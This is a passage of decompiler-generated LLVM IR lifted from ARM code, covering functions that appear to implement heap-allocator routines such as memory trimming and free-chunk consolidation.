  uselistorder label %dec_label_pc_132d4, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_132cc, { 1, 0 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %.thread44, { 1, 0 }
  uselistorder label %.thread43, { 1, 0 }
  uselistorder label %.thread40, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_131a0, { 1, 0 }
  uselistorder label %.thread32, { 1, 0 }
  uselistorder label %bb157, { 1, 0 }
  uselistorder label %bb153, { 1, 0 }
  uselistorder label %dec_label_pc_130d4, { 2, 0, 3, 1 }
  uselistorder label %bb150, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
  uselistorder label %.thread27, { 1, 0 }
  uselistorder label %dec_label_pc_12f8c, { 0, 2, 1 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %bb144, { 1, 0 }
  uselistorder label %dec_label_pc_12ee0, { 1, 0 }
  uselistorder label %dec_label_pc_12ee8.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_12eac, { 1, 0 }
  uselistorder label %dec_label_pc_12e60, { 1, 0 }
  uselistorder label %dec_label_pc_12df4, { 1, 0 }
  uselistorder label %dec_label_pc_12df0, { 1, 0 }
  uselistorder label %dec_label_pc_12d9c, { 1, 0 }
  uselistorder label %dec_label_pc_12d88, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12d50, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_12d3c, { 1, 0 }
  uselistorder label %bb140, { 1, 0 }
  uselistorder label %bb138, { 1, 0 }
}

define i32 @function_13408(i32 %arg1) local_unnamed_addr {
dec_label_pc_13408:
  %v0_13408 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13408, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_13408
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_13408, %bb
  %v10_1341c = phi i32 [ %arg1, %dec_label_pc_13408 ], [ 0, %bb ]
  ret i32 %v10_1341c

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @function_13420(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13420:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v1_13420 = add i32 %arg2, 44
  %v2_13420 = inttoptr i32 %v1_13420 to i32*
  %v3_13420 = load i32, i32* %v2_13420, align 4
  %v3_13424 = load i32, i32* @r4, align 4
  store i32 %v3_13424, i32* %stack_var_-20, align 4
  %v1_13428 = add i32 %v3_13420, 4
  %v2_13428 = inttoptr i32 %v1_13428 to i32*
  %v3_13428 = load i32, i32* %v2_13428, align 4
  %v1_1342c = add i32 %arg2, 860
  %v2_1342c = inttoptr i32 %v1_1342c to i32*
  %v3_1342c = load i32, i32* %v2_1342c, align 4
  store i32 %v3_1342c, i32* @r4, align 4
  %v1_13430 = and i32 %v3_13428, -4
  store i32 %v1_13430, i32* @r6, align 4
  %v1_13434 = add i32 %v1_13430, -17
  %v2_13438 = add i32 %v1_13434, %v3_1342c
  store i32 %arg2, i32* @r5, align 4
  %v2_13444 = sub i32 %v2_13438, %arg1
  store i32 %v2_13444, i32* @r0, align 4
  store i32 %v3_1342c, i32* @r1, align 4
  %v0_1344c = call i32 @function_102cc()
  %v1_13450 = add i32 %v0_1344c, -1
  store i32 %v1_13450, i32* %r0.global-to-local, align 4
  %v0_13454 = load i32, i32* @r4, align 4
  %v2_13454 = mul i32 %v0_13454, %v1_13450
  store i32 %v2_13454, i32* %r7.global-to-local, align 4
  %v2_13458 = icmp eq i32 %v2_13454, 0
  store i1 %v2_13458, i1* @cpsr_z, align 1
  %tmp8 = icmp slt i32 %v2_13454, 1
  br i1 %tmp8, label %dec_label_pc_134c0, label %dec_label_pc_13460

dec_label_pc_13460:                               ; preds = %dec_label_pc_13420
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_13464 = call i32 @function_15210(i32 0)
  store i32 %v1_13464, i32* %r0.global-to-local, align 4
  %v0_13468 = load i32, i32* @r5, align 4
  %v1_13468 = add i32 %v0_13468, 44
  %v2_13468 = inttoptr i32 %v1_13468 to i32*
  %v3_13468 = load i32, i32* %v2_13468, align 4
  %v0_1346c = load i32, i32* @r6, align 4
  %v2_1346c = add i32 %v0_1346c, %v3_13468
  %v9_13470 = icmp eq i32 %v1_13464, %v2_1346c
  store i1 %v9_13470, i1* @cpsr_z, align 1
  store i32 %v1_13464, i32* @r4, align 4
  br i1 %v9_13470, label %dec_label_pc_1347c, label %dec_label_pc_134c0

dec_label_pc_1347c:                               ; preds = %dec_label_pc_13460
  %v0_1347c = load i32, i32* %r7.global-to-local, align 4
  %v1_1347c = sub i32 0, %v0_1347c
  store i32 %v1_1347c, i32* %r0.global-to-local, align 4
  %v1_13480 = call i32 @function_15210(i32 %v1_1347c)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_13488 = call i32 @function_15210(i32 0)
  store i32 %v1_13488, i32* %r0.global-to-local, align 4
  %v7_1348c = icmp eq i32 %v1_13488, -1
  store i1 %v7_1348c, i1* @cpsr_z, align 1
  br i1 %v7_1348c, label %dec_label_pc_134c0, label %dec_label_pc_13494

dec_label_pc_13494:                               ; preds = %dec_label_pc_1347c
  %v0_13494 = load i32, i32* @r4, align 4
  %v2_13494 = sub i32 %v0_13494, %v1_13488
  store i32 %v2_13494, i32* %r0.global-to-local, align 4
  %v9_13494 = icmp eq i32 %v0_13494, %v1_13488
  store i1 %v9_13494, i1* @cpsr_z, align 1
  br i1 %v9_13494, label %dec_label_pc_134c0, label %dec_label_pc_1349c

dec_label_pc_1349c:                               ; preds = %dec_label_pc_13494
  %v0_1349c = load i32, i32* @r5, align 4
  %v1_1349c = add i32 %v0_1349c, 872
  %v2_1349c = inttoptr i32 %v1_1349c to i32*
  %v3_1349c = load i32, i32* %v2_1349c, align 4
  %v1_134a0 = load i32, i32* @r6, align 4
  %v2_134a0 = sub i32 %v1_134a0, %v2_13494
  store i32 %v2_134a0, i32* %r2.global-to-local, align 4
  %v1_134a4 = add i32 %v0_1349c, 44
  %v2_134a4 = inttoptr i32 %v1_134a4 to i32*
  %v3_134a4 = load i32, i32* %v2_134a4, align 4
  store i32 %v3_134a4, i32* %r1.global-to-local, align 4
  %v2_134a8 = sub i32 %v3_1349c, %v2_13494
  %v1_134ac = or i32 %v2_134a0, 1
  store i32 %v1_134ac, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_134a8, i32* %v2_1349c, align 4
  %v0_134b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_134b8 = load i32, i32* %r1.global-to-local, align 4
  %v2_134b8 = add i32 %v1_134b8, 4
  %v3_134b8 = inttoptr i32 %v2_134b8 to i32*
  store i32 %v0_134b8, i32* %v3_134b8, align 4
  %v1_134cc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_134c4

dec_label_pc_134c0:                               ; preds = %dec_label_pc_13460, %dec_label_pc_13494, %dec_label_pc_1347c, %dec_label_pc_13420
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_134c4

dec_label_pc_134c4:                               ; preds = %dec_label_pc_1349c, %dec_label_pc_134c0
  %v1_134cc = phi i32 [ %v1_134cc.pre, %dec_label_pc_1349c ], [ 0, %dec_label_pc_134c0 ]
  %v2_134c8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_134c8, i32* @r4, align 4
  ret i32 %v1_134cc

; uselistorder directives
  uselistorder i1 %v7_1348c, { 1, 0 }
  uselistorder i32 %v1_13488, { 2, 1, 0, 3 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 10, 9, 8, 0 }
  uselistorder i32 (i32)* @function_15210, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_134c4, { 1, 0 }
  uselistorder label %dec_label_pc_134c0, { 1, 2, 0, 3 }
}

define i32 @function_134d0() local_unnamed_addr {
dec_label_pc_134d0:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_134d0 = load i32, i32* @r4, align 4
  store i32 %v3_134d0, i32* %stack_var_-36, align 4
  %v0_134d4 = load i32, i32* @r0, align 4
  %v1_134d4 = inttoptr i32 %v0_134d4 to i32*
  %v2_134d4 = load i32, i32* %v1_134d4, align 4
  store i32 %v2_134d4, i32* %r3.global-to-local, align 4
  %v2_134d8 = icmp eq i32 %v2_134d4, 0
  store i32 %v0_134d4, i32* @r4, align 4
  br i1 %v2_134d8, label %dec_label_pc_13610.preheader, label %dec_label_pc_134ec

dec_label_pc_13610.preheader:                     ; preds = %dec_label_pc_134d0
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_1361825 = add i32 %v0_134d4, 52
  store i32 %v1_1361825, i32* %r3.global-to-local, align 4
  %v2_1362026 = add i32 %v0_134d4, 60
  %v3_1362027 = inttoptr i32 %v2_1362026 to i32*
  store i32 %v1_1361825, i32* %v3_1362027, align 4
  %v0_1362428 = load i32, i32* %r3.global-to-local, align 4
  %v2_1362429 = add i32 %v0_1362428, 12
  %v3_1362430 = inttoptr i32 %v2_1362429 to i32*
  store i32 %v0_1362428, i32* %v3_1362430, align 4
  br label %dec_label_pc_13610.dec_label_pc_13610_crit_edge

dec_label_pc_134ec:                               ; preds = %dec_label_pc_134d0
  %v1_134ec = and i32 %v2_134d4, -3
  %v3_134f0 = udiv i32 %v2_134d4, 8
  store i32 %v3_134f0, i32* %r2.global-to-local, align 4
  store i32 %v1_134ec, i32* %v1_134d4, align 4
  %v0_134f8 = load i32, i32* @r0, align 4
  %v1_134f8 = add i32 %v0_134f8, -4
  store i32 %v1_134f8, i32* %r3.global-to-local, align 4
  %v1_134fc = load i32, i32* %r2.global-to-local, align 4
  %v4_134fc = mul i32 %v1_134fc, 4
  %v5_134fc = add i32 %v4_134fc, %v1_134f8
  store i32 %v5_134fc, i32* %sb.global-to-local, align 4
  %v1_13500 = add i32 %v0_134f8, 52
  store i32 %v1_13500, i32* %r7.global-to-local, align 4
  %v1_13504 = add i32 %v0_134f8, 4
  store i32 %v1_13504, i32* %r6.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_1350c

dec_label_pc_1350c:                               ; preds = %dec_label_pc_13608, %dec_label_pc_134ec
  %v1_1360010 = phi i32 [ %v1_13600, %dec_label_pc_13608 ], [ %v5_134fc, %dec_label_pc_134ec ]
  %v1_13518 = phi i32 [ %v1_13608, %dec_label_pc_13608 ], [ %v1_13504, %dec_label_pc_134ec ]
  %v1_1350c = inttoptr i32 %v1_13518 to i32*
  %v2_1350c = load i32, i32* %v1_1350c, align 4
  store i32 %v2_1350c, i32* %r1.global-to-local, align 4
  %v2_13510 = icmp eq i32 %v2_1350c, 0
  br i1 %v2_13510, label %dec_label_pc_13600, label %dec_label_pc_13518

dec_label_pc_13518:                               ; preds = %dec_label_pc_1350c
  %v0_13518 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_13518, i32* %v1_1350c, align 4
  %v0_1351c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1351c

dec_label_pc_1351c:                               ; preds = %dec_label_pc_135f4, %dec_label_pc_13518
  %v0_13538 = phi i32 [ %v0_135f4, %dec_label_pc_135f4 ], [ %v0_1351c.pre, %dec_label_pc_13518 ]
  %v1_1351c = add i32 %v0_13538, 4
  %v2_1351c = inttoptr i32 %v1_1351c to i32*
  %v3_1351c = load i32, i32* %v2_1351c, align 4
  store i32 %v3_1351c, i32* %r3.global-to-local, align 4
  %v1_13520 = and i32 %v3_1351c, -2
  store i32 %v1_13520, i32* %lr.global-to-local, align 4
  %v2_13524 = add i32 %v1_13520, %v0_13538
  store i32 %v2_13524, i32* @r0, align 4
  %v1_13528 = urem i32 %v3_1351c, 2
  %v2_13528 = icmp eq i32 %v1_13528, 0
  %v1_1352c = add i32 %v0_13538, 8
  %v2_1352c = inttoptr i32 %v1_1352c to i32*
  %v3_1352c = load i32, i32* %v2_1352c, align 4
  store i32 %v3_1352c, i32* %sl.global-to-local, align 4
  %v1_13530 = add i32 %v2_13524, 4
  %v2_13530 = inttoptr i32 %v1_13530 to i32*
  %v3_13530 = load i32, i32* %v2_13530, align 4
  store i32 %v3_13530, i32* %r8.global-to-local, align 4
  br i1 %v2_13528, label %dec_label_pc_13538, label %dec_label_pc_1356c

dec_label_pc_13538:                               ; preds = %dec_label_pc_1351c
  %v1_13538 = inttoptr i32 %v0_13538 to i32*
  %v2_13538 = load i32, i32* %v1_13538, align 4
  store i32 %v2_13538, i32* %r5.global-to-local, align 4
  %v2_1353c = sub i32 %v0_13538, %v2_13538
  store i32 %v2_1353c, i32* %r3.global-to-local, align 4
  %v1_13540 = add i32 %v2_1353c, 8
  %v2_13540 = inttoptr i32 %v1_13540 to i32*
  %v3_13540 = load i32, i32* %v2_13540, align 4
  store i32 %v3_13540, i32* %ip.global-to-local, align 4
  %v1_13544 = add i32 %v3_13540, 12
  %v2_13544 = inttoptr i32 %v1_13544 to i32*
  %v3_13544 = load i32, i32* %v2_13544, align 4
  store i32 %v3_13544, i32* %r1.global-to-local, align 4
  %v9_13548 = icmp eq i32 %v3_13544, %v2_1353c
  %v1_1354c = add i32 %v2_1353c, 12
  %v2_1354c = inttoptr i32 %v1_1354c to i32*
  %v3_1354c = load i32, i32* %v2_1354c, align 4
  store i32 %v3_1354c, i32* %r2.global-to-local, align 4
  br i1 %v9_13548, label %dec_label_pc_13554, label %dec_label_pc_135b0

dec_label_pc_13554:                               ; preds = %dec_label_pc_13538
  %v1_13554 = add i32 %v3_1354c, 8
  %v2_13554 = inttoptr i32 %v1_13554 to i32*
  %v3_13554 = load i32, i32* %v2_13554, align 4
  store i32 %v3_13554, i32* %r3.global-to-local, align 4
  %v9_13558 = icmp eq i32 %v3_13554, %v2_1353c
  br i1 %v9_13558, label %dec_label_pc_13560, label %dec_label_pc_135b0

dec_label_pc_13560:                               ; preds = %dec_label_pc_13554
  store i32 %v3_13540, i32* %v2_13554, align 4
  %v0_13564 = load i32, i32* %r2.global-to-local, align 4
  %v1_13564 = load i32, i32* %ip.global-to-local, align 4
  %v2_13564 = add i32 %v1_13564, 12
  %v3_13564 = inttoptr i32 %v2_13564 to i32*
  store i32 %v0_13564, i32* %v3_13564, align 4
  %v0_13568 = load i32, i32* %lr.global-to-local, align 4
  %v1_13568 = load i32, i32* %r5.global-to-local, align 4
  %v2_13568 = add i32 %v1_13568, %v0_13568
  store i32 %v2_13568, i32* %lr.global-to-local, align 4
  %v0_13570.pre = load i32, i32* @r0, align 4
  %v0_13574.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1356c

dec_label_pc_1356c:                               ; preds = %dec_label_pc_1351c, %dec_label_pc_13560
  %v0_135e4 = phi i32 [ %v1_13520, %dec_label_pc_1351c ], [ %v2_13568, %dec_label_pc_13560 ]
  %v0_13574 = phi i32 [ %v3_13530, %dec_label_pc_1351c ], [ %v0_13574.pre, %dec_label_pc_13560 ]
  %v1_13588 = phi i32 [ %v2_13524, %dec_label_pc_1351c ], [ %v0_13570.pre, %dec_label_pc_13560 ]
  %v0_1356c = load i32, i32* @r4, align 4
  %v1_1356c = add i32 %v0_1356c, 44
  %v2_1356c = inttoptr i32 %v1_1356c to i32*
  %v3_1356c = load i32, i32* %v2_1356c, align 4
  store i32 %v3_1356c, i32* %r3.global-to-local, align 4
  %v9_13570 = icmp eq i32 %v1_13588, %v3_1356c
  %v1_13574 = and i32 %v0_13574, -4
  store i32 %v1_13574, i32* %r5.global-to-local, align 4
  br i1 %v9_13570, label %dec_label_pc_135e4, label %dec_label_pc_1357c

dec_label_pc_1357c:                               ; preds = %dec_label_pc_1356c
  %v2_1357c = add i32 %v1_13588, %v1_13574
  store i32 %v2_1357c, i32* %r3.global-to-local, align 4
  %v1_13580 = add i32 %v2_1357c, 4
  %v2_13580 = inttoptr i32 %v1_13580 to i32*
  %v3_13580 = load i32, i32* %v2_13580, align 4
  store i32 %v3_13580, i32* %r3.global-to-local, align 4
  %v1_13584 = urem i32 %v3_13580, 2
  %v2_13584 = icmp eq i32 %v1_13584, 0
  %v2_13588 = add i32 %v1_13588, 4
  %v3_13588 = inttoptr i32 %v2_13588 to i32*
  store i32 %v1_13574, i32* %v3_13588, align 4
  br i1 %v2_13584, label %dec_label_pc_13590, label %dec_label_pc_1357c.dec_label_pc_135c0_crit_edge

dec_label_pc_1357c.dec_label_pc_135c0_crit_edge:  ; preds = %dec_label_pc_1357c
  %v0_135c4.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_135c0

dec_label_pc_13590:                               ; preds = %dec_label_pc_1357c
  %v0_13590 = load i32, i32* @r0, align 4
  %v1_13590 = add i32 %v0_13590, 8
  %v2_13590 = inttoptr i32 %v1_13590 to i32*
  %v3_13590 = load i32, i32* %v2_13590, align 4
  store i32 %v3_13590, i32* %ip.global-to-local, align 4
  %v1_13594 = add i32 %v3_13590, 12
  %v2_13594 = inttoptr i32 %v1_13594 to i32*
  %v3_13594 = load i32, i32* %v2_13594, align 4
  store i32 %v3_13594, i32* %r3.global-to-local, align 4
  %v9_13598 = icmp eq i32 %v3_13594, %v0_13590
  %v1_1359c = add i32 %v0_13590, 12
  %v2_1359c = inttoptr i32 %v1_1359c to i32*
  %v3_1359c = load i32, i32* %v2_1359c, align 4
  store i32 %v3_1359c, i32* %r2.global-to-local, align 4
  br i1 %v9_13598, label %dec_label_pc_135a4, label %dec_label_pc_135b0

dec_label_pc_135a4:                               ; preds = %dec_label_pc_13590
  %v1_135a4 = add i32 %v3_1359c, 8
  %v2_135a4 = inttoptr i32 %v1_135a4 to i32*
  %v3_135a4 = load i32, i32* %v2_135a4, align 4
  store i32 %v3_135a4, i32* %r3.global-to-local, align 4
  %v9_135a8 = icmp eq i32 %v3_135a4, %v0_13590
  br i1 %v9_135a8, label %dec_label_pc_135b4, label %dec_label_pc_135b0

dec_label_pc_135b0:                               ; preds = %dec_label_pc_13590, %dec_label_pc_13554, %dec_label_pc_13538, %dec_label_pc_135a4
  %v0_135b0 = call i32 @function_13900()
  store i32 %v0_135b0, i32* @r0, align 4
  %v0_135b4.pre = load i32, i32* @ip, align 4
  %v1_135b4.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_135b4

dec_label_pc_135b4:                               ; preds = %dec_label_pc_135a4, %dec_label_pc_135b0
  %v1_135b4 = phi i32 [ %v3_1359c, %dec_label_pc_135a4 ], [ %v1_135b4.pre, %dec_label_pc_135b0 ]
  %v0_135b4 = phi i32 [ %v3_13590, %dec_label_pc_135a4 ], [ %v0_135b4.pre, %dec_label_pc_135b0 ]
  %v2_135b4 = add i32 %v1_135b4, 8
  %v3_135b4 = inttoptr i32 %v2_135b4 to i32*
  store i32 %v0_135b4, i32* %v3_135b4, align 4
  %v0_135b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_135b8 = load i32, i32* %ip.global-to-local, align 4
  %v2_135b8 = add i32 %v1_135b8, 12
  %v3_135b8 = inttoptr i32 %v2_135b8 to i32*
  store i32 %v0_135b8, i32* %v3_135b8, align 4
  %v0_135bc = load i32, i32* %lr.global-to-local, align 4
  %v1_135bc = load i32, i32* %r5.global-to-local, align 4
  %v2_135bc = add i32 %v1_135bc, %v0_135bc
  store i32 %v2_135bc, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_135c0

dec_label_pc_135c0:                               ; preds = %dec_label_pc_1357c.dec_label_pc_135c0_crit_edge, %dec_label_pc_135b4
  %v0_135c4 = phi i32 [ %v0_135c4.pre, %dec_label_pc_1357c.dec_label_pc_135c0_crit_edge ], [ %v2_135bc, %dec_label_pc_135b4 ]
  %v0_135c0 = load i32, i32* %r7.global-to-local, align 4
  %v1_135c0 = add i32 %v0_135c0, 8
  %v2_135c0 = inttoptr i32 %v1_135c0 to i32*
  %v3_135c0 = load i32, i32* %v2_135c0, align 4
  store i32 %v3_135c0, i32* %r2.global-to-local, align 4
  %v1_135c4 = or i32 %v0_135c4, 1
  store i32 %v1_135c4, i32* %r3.global-to-local, align 4
  %v0_135c8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_135c8, i32* %v2_135c0, align 4
  %v0_135cc = load i32, i32* %r1.global-to-local, align 4
  %v1_135cc = load i32, i32* %r2.global-to-local, align 4
  %v2_135cc = add i32 %v1_135cc, 12
  %v3_135cc = inttoptr i32 %v2_135cc to i32*
  store i32 %v0_135cc, i32* %v3_135cc, align 4
  %v0_135d0 = load i32, i32* %lr.global-to-local, align 4
  %v1_135d0 = load i32, i32* %r1.global-to-local, align 4
  %v3_135d0 = add i32 %v1_135d0, %v0_135d0
  %v4_135d0 = inttoptr i32 %v3_135d0 to i32*
  store i32 %v0_135d0, i32* %v4_135d0, align 4
  %v0_135d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_135d4 = load i32, i32* %r1.global-to-local, align 4
  %v2_135d4 = add i32 %v1_135d4, 4
  %v3_135d4 = inttoptr i32 %v2_135d4 to i32*
  store i32 %v0_135d4, i32* %v3_135d4, align 4
  %v0_135d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_135d8 = load i32, i32* %r1.global-to-local, align 4
  %v2_135d8 = add i32 %v1_135d8, 8
  %v3_135d8 = inttoptr i32 %v2_135d8 to i32*
  store i32 %v0_135d8, i32* %v3_135d8, align 4
  %v0_135dc = load i32, i32* %r7.global-to-local, align 4
  %v1_135dc = load i32, i32* %r1.global-to-local, align 4
  %v2_135dc = add i32 %v1_135dc, 12
  %v3_135dc = inttoptr i32 %v2_135dc to i32*
  store i32 %v0_135dc, i32* %v3_135dc, align 4
  br label %dec_label_pc_135f4

dec_label_pc_135e4:                               ; preds = %dec_label_pc_1356c
  %v2_135e4 = add i32 %v1_13574, %v0_135e4
  %v1_135e8 = or i32 %v2_135e4, 1
  store i32 %v1_135e8, i32* %r3.global-to-local, align 4
  %v1_135ec = load i32, i32* %r1.global-to-local, align 4
  %v2_135ec = add i32 %v1_135ec, 4
  %v3_135ec = inttoptr i32 %v2_135ec to i32*
  store i32 %v1_135e8, i32* %v3_135ec, align 4
  %v0_135f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_135f0 = load i32, i32* @r4, align 4
  %v2_135f0 = add i32 %v1_135f0, 44
  %v3_135f0 = inttoptr i32 %v2_135f0 to i32*
  store i32 %v0_135f0, i32* %v3_135f0, align 4
  br label %dec_label_pc_135f4

dec_label_pc_135f4:                               ; preds = %dec_label_pc_135c0, %dec_label_pc_135e4
  %v0_135f4 = load i32, i32* %sl.global-to-local, align 4
  %v2_135f4 = icmp eq i32 %v0_135f4, 0
  store i32 %v0_135f4, i32* %r1.global-to-local, align 4
  br i1 %v2_135f4, label %dec_label_pc_13600.loopexit, label %dec_label_pc_1351c

dec_label_pc_13600.loopexit:                      ; preds = %dec_label_pc_135f4
  %v0_13600.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_13600.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_13600

dec_label_pc_13600:                               ; preds = %dec_label_pc_13600.loopexit, %dec_label_pc_1350c
  %v1_13600 = phi i32 [ %v1_13600.pre, %dec_label_pc_13600.loopexit ], [ %v1_1360010, %dec_label_pc_1350c ]
  %v0_13608 = phi i32 [ %v0_13600.pre, %dec_label_pc_13600.loopexit ], [ %v1_13518, %dec_label_pc_1350c ]
  %v9_13600 = icmp eq i32 %v0_13608, %v1_13600
  br i1 %v9_13600, label %dec_label_pc_13678, label %dec_label_pc_13608

dec_label_pc_13608:                               ; preds = %dec_label_pc_13600
  %v1_13608 = add i32 %v0_13608, 4
  store i32 %v1_13608, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1350c

dec_label_pc_13610.dec_label_pc_13610_crit_edge:  ; preds = %dec_label_pc_13610.preheader, %dec_label_pc_13610.dec_label_pc_13610_crit_edge
  %v0_13610.pre = load i32, i32* @r4, align 4
  %v1_13610.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_13610 = mul i32 %v1_13610.pre, 8
  %v5_13610 = add i32 %v4_13610, %v0_13610.pre
  %v1_13614 = add i32 %v1_13610.pre, 1
  store i32 %v1_13614, i32* %r2.global-to-local, align 4
  %v1_13618 = add i32 %v5_13610, 44
  store i32 %v1_13618, i32* %r3.global-to-local, align 4
  %v2_13620 = add i32 %v5_13610, 52
  %v3_13620 = inttoptr i32 %v2_13620 to i32*
  store i32 %v1_13618, i32* %v3_13620, align 4
  %v0_13624 = load i32, i32* %r3.global-to-local, align 4
  %v2_13624 = add i32 %v0_13624, 12
  %v3_13624 = inttoptr i32 %v2_13624 to i32*
  store i32 %v0_13624, i32* %v3_13624, align 4
  %v7_13628 = icmp sgt i32 %v1_13614, 95
  br i1 %v7_13628, label %dec_label_pc_1362c, label %dec_label_pc_13610.dec_label_pc_13610_crit_edge

dec_label_pc_1362c:                               ; preds = %dec_label_pc_13610.dec_label_pc_13610_crit_edge
  %v0_1362c = load i32, i32* @r4, align 4
  %v1_1362c = inttoptr i32 %v0_1362c to i32*
  %v2_1362c = load i32, i32* %v1_1362c, align 4
  store i32 %v2_1362c, i32* %r2.global-to-local, align 4
  %v1_13630 = add i32 %v0_1362c, 864
  %v2_13630 = inttoptr i32 %v1_13630 to i32*
  %v3_13630 = load i32, i32* %v2_13630, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_13638 = urem i32 %v2_1362c, 4
  store i32 262144, i32* %r0.global-to-local, align 4
  %v1_13640 = or i32 %v3_13630, 1
  store i32 %v1_13640, i32* %r1.global-to-local, align 4
  %v1_13644 = or i32 %v1_13638, 72
  store i32 %v1_13644, i32* %r2.global-to-local, align 4
  %v1_13648 = add i32 %v0_1362c, 52
  store i32 %v1_13648, i32* %ip.global-to-local, align 4
  %v2_1364c = add i32 %v0_1362c, 840
  %v3_1364c = inttoptr i32 %v2_1364c to i32*
  store i32 0, i32* %v3_1364c, align 4
  %v0_13650 = load i32, i32* %r3.global-to-local, align 4
  %v1_13650 = add i32 %v0_13650, 65536
  store i32 %v1_13650, i32* %r3.global-to-local, align 4
  %v0_13654 = load i32, i32* %r0.global-to-local, align 4
  %v1_13654 = load i32, i32* @r4, align 4
  %v2_13654 = add i32 %v1_13654, 836
  %v3_13654 = inttoptr i32 %v2_13654 to i32*
  store i32 %v0_13654, i32* %v3_13654, align 4
  %v0_13658 = load i32, i32* %r0.global-to-local, align 4
  %v1_13658 = load i32, i32* @r4, align 4
  %v2_13658 = add i32 %v1_13658, 844
  %v3_13658 = inttoptr i32 %v2_13658 to i32*
  store i32 %v0_13658, i32* %v3_13658, align 4
  %v0_1365c = load i32, i32* %r3.global-to-local, align 4
  %v1_1365c = load i32, i32* @r4, align 4
  %v2_1365c = add i32 %v1_1365c, 852
  %v3_1365c = inttoptr i32 %v2_1365c to i32*
  store i32 %v0_1365c, i32* %v3_1365c, align 4
  %v0_13660 = load i32, i32* %r1.global-to-local, align 4
  %v1_13660 = load i32, i32* @r4, align 4
  %v2_13660 = add i32 %v1_13660, 864
  %v3_13660 = inttoptr i32 %v2_13660 to i32*
  store i32 %v0_13660, i32* %v3_13660, align 4
  %v0_13664 = load i32, i32* %r2.global-to-local, align 4
  %v1_13664 = load i32, i32* @r4, align 4
  %v2_13664 = inttoptr i32 %v1_13664 to i32*
  store i32 %v0_13664, i32* %v2_13664, align 4
  %v0_13668 = load i32, i32* %ip.global-to-local, align 4
  %v1_13668 = load i32, i32* @r4, align 4
  %v2_13668 = add i32 %v1_13668, 44
  %v3_13668 = inttoptr i32 %v2_13668 to i32*
  store i32 %v0_13668, i32* %v3_13668, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_13670 = call i32 @function_144dc(i32 30)
  store i32 %v1_13670, i32* @r0, align 4
  %v1_13674 = load i32, i32* @r4, align 4
  %v2_13674 = add i32 %v1_13674, 860
  %v3_13674 = inttoptr i32 %v2_13674 to i32*
  store i32 %v1_13670, i32* %v3_13674, align 4
  br label %dec_label_pc_13678

dec_label_pc_13678:                               ; preds = %dec_label_pc_13600, %dec_label_pc_1362c
  %v2_1367c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_1367c, i32* @r4, align 4
  %v1_13680 = load i32, i32* @r0, align 4
  ret i32 %v1_13680

; uselistorder directives
  uselistorder i32 %v0_1362c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_13624, { 1, 0 }
  uselistorder i32 %v1_13608, { 1, 0 }
  uselistorder i32 %v0_135f4, { 0, 2, 1 }
  uselistorder i32 %v0_135d0, { 1, 0 }
  uselistorder i32 %v1_13520, { 1, 0, 2 }
  uselistorder i32 %v0_13538, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_134f8, { 1, 0, 2 }
